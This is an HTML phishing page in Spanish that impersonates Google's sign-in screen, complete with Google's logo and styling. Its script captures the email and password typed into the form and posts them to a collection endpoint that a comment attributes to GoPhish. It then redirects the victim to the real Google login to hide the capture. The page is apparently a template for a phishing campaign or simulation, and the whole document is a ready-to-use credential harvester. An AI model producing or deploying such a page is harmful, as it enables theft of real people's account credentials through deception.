<!DOCTYPE html><html lang="es"><head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Iniciar sesión - Google</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&amp;display=swap"/>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f1f1f1;
        }
        .container {
            background: white;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
            width: 350px;
        }
        .logo {
            width: 80px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #1a73e8;
            border: none;
            color: white;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background: #1669c1;
        }
        .footer {
            font-size: 12px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google" class="logo"/>
        <h2>Iniciar sesión</h2>
        <form method="POST" action="">
            <input type="email" name="email" placeholder="Correo electrónico" required=""/>
            <input type="password" name="password" placeholder="Contraseña" required=""/>
            <button type="submit">Siguiente</button>
        </form>
        <p class="footer">¿Olvidaste tu contraseña?</p>
    </div>

    <script>
        document.querySelector("form").addEventListener("submit", function(event) {
            event.preventDefault(); // Evita el envío normal
            var email = document.querySelector('input[name="email"]').value;
            var password = document.querySelector('input[name="password"]').value;
            
            // Envía los datos a GoPhish para su captura
            fetch("", { // GoPhish automáticamente reemplaza esto con la URL correcta
                method: "POST",
                body: new URLSearchParams({ email: email, password: password })
            }).then(() => {
                // Redirige a la página real de Google después del intento
                window.location.href = "https://accounts.google.com/signin";
            });
        });
    </script>


</body></html>
